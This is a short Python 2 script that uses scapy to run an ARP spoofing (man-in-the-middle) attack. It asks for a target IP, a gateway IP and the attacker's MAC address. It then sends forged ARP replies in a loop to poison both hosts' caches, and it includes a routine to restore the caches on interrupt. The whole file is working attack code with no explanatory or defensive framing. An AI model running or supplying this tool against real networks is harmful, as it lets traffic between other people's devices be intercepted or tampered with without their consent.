import os, sys, threading
from scapy.all import *

packet_count=1000
    
def getMacAddr(destIP):
    responses, unanswered=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=destIP), timeout=1, retry=10)
    for s,r in responses:
        return r[Ether].src
    
def arpSpoofer(gatewayIP, spoofMac, targetIP, targetMac, attackerMac):
    try:
        print "[+] Beginning the ARP Spoofing"
        while(1):
            send(ARP(op=2, psrc=gatewayIP, pdst=targetIP, hwsrc=attackerMac, hwdst=targetMac))
            send(ARP(op=2, psrc=targetIP, pdst=gatewayIP, hwsrc=targetMac, hwdst=spoofMac))
            time.sleep(2)
    except KeyboardInterrupt:
        restore(gatewayIP, spoofMac, targetIP, targetMac)
        exit(0)
   
def restore(gatewayIP, spoofMac, targetIP, targetMac):
    send(ARP(op=2, psrc=gatewayIP, pdst=targetIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=spoofMac), count=5)
    send(ARP(op=2, psrc=targetIP, pdst=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetMac), count=5)
    print "[+] Restored"
    
def main():
    try:
        targetIP=raw_input("Input Target IP : ")
        gatewayIP=raw_input("Input Gateway IP : ")
        attackerMac=raw_input("Input Attacker Mac Address( ex) 00:0c:29:05:9a:08 ) : ")
        spoofMac=getMacAddr(gatewayIP)
        targetMac=getMacAddr(targetIP)
        t=threading.Thread(target=arpSpoofer, args=(gatewayIP, spoofMac, targetIP, targetMac, attackerMac))
        t.start()
    except KeyboardInterrupt:
        restore(gatewayIP, spoofMac, targetIP, targetMac)
        exit(0)

if __name__=="__main__":
    main()